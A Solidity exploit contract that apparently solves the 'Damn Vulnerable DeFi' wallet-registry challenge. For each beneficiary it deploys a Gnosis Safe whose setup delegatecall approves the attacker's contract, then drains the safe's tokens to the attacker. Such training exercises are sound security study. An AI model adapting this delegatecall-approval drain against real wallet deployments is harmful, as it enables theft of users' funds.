// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";

import "../DamnValuableToken.sol";
import "hardhat/console.sol";
contract WalletRegistryAttack{

    GnosisSafeProxyFactory public factory;
    address public attacker ;
    address public singleton ;
    IProxyCreationCallback public callback ;
    DamnValuableToken public damnValuableToken;
    constructor(
        GnosisSafeProxyFactory factory_,
        IProxyCreationCallback callback_,
        DamnValuableToken damnValuableToken_,
        address singleton_
    ){
        factory =factory_;
        callback = callback_;
        damnValuableToken = damnValuableToken_;
        singleton = singleton_;
        attacker = msg.sender;

    }

    function approve(address token, address toApprove) external {
        DamnValuableToken(token).approve(toApprove,10 ether);
    }

    function stealTokens(address[] memory initialBeneficiaries ) public{
        //We iterate over the list beneficiaries as we need to create a wallet for each one to get all 40 tokens. 
        for (uint i = 0; i < initialBeneficiaries.length; i++){
            

            /**
            First we create the data for the delegate call which will executed by the setup method on the gnosis safe.
            This will tell the safe to approve this attack contract to transfer its 10 tokens
             */
            bytes memory delegateCall = abi.encodeWithSelector(
                WalletRegistryAttack.approve.selector,
                address(damnValuableToken),
                address(this)
            );

            /**
            Second we create the data for the setup method call on the gnosis safe
             */

            // function setup(
            //     address[] calldata _owners,
            //     uint256 _threshold,
            //     address to,
            //     bytes calldata data,
            //     address fallbackHandler,
            //     address paymentToken,
            //     uint256 payment,
            //     address payable paymentReceiver
            // )
            address[] memory owner = new address[](1);
            owner[0]=initialBeneficiaries[i];
            bytes memory initializer = abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                owner,
                1,
                address(this),
                delegateCall,
                0x0,
                0x0,
                0,
                0x0
            );


            /**
            Third we create the safe using the factory while passing the intializer for calling the setup method on the safe
             */
            // function createProxyWithCallback(
            //     address _singleton,
            //     bytes memory initializer,
            //     uint256 saltNonce,
            //     IProxyCreationCallback callback
            // )

            //create the safe for the beneficiary using the delegate which will approve this contract to spend the safe's tokens
            GnosisSafeProxy safe = factory.createProxyWithCallback(
                singleton,
                initializer,
                i,
                callback
            );

            /**
            Since we've approved the tokens of the safe to be transferred by this contract, 
            we can go ahead and transfer them to the attacker.
             */
            damnValuableToken.transferFrom(address(safe),attacker, 10 ether);

        }

    }

}